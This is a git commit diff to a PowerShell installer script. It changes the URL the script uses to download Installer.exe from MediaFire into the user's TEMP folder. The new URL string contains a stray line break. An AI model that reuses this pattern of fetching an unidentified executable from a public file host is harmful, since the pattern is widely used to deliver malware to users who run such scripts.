26d0747caa5a7c0401305b2ff318c11ec94774d9
zta2 <srsazam@gmail.com>
2026-02-03 11:18:51 +0300

    Update installer.ps1

--- installer.ps1
+++ installer.ps1
@@ -1,4 +1,5 @@
-$url = "https://www.mediafire.com/file/fv85qk44ehjq6t6/Installer.exe/file"
+$url = "
+https://download1500.mediafire.com/s6bkxdthw2vg2XRcJcZvfglwnSNyaF6LKnAgeIUntHDbyy5maau44MdyRc2Wo7RJXqG20-njA2H02nRTxBJD2AscfsIZE03eZyt7t-1EepXOi7tD8iPCBKYscXLe8ayNMFp5RXh2nhZxB6aiNLNK792RfLVpAoLXUciLHRRP4JCK/fv85qk44ehjq6t6/Installer.exe"
 $output = "$env:TEMP\installer.exe"
 
 Write-Host "Downloading software installer..."
